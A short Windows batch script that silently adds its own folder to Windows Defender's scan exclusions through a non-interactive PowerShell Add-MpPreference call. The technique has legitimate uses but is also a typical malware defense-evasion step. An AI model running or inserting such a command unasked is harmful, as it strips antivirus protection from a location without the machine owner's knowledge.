@echo off

:: Remove certain location from Windows Defender scan

set EXCL_PATH=%~dp0
set EXCL_PATH=%EXCL_PATH:~0,-1%
powershell.exe -InputFormat none -OutputFormat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%EXCL_PATH%"
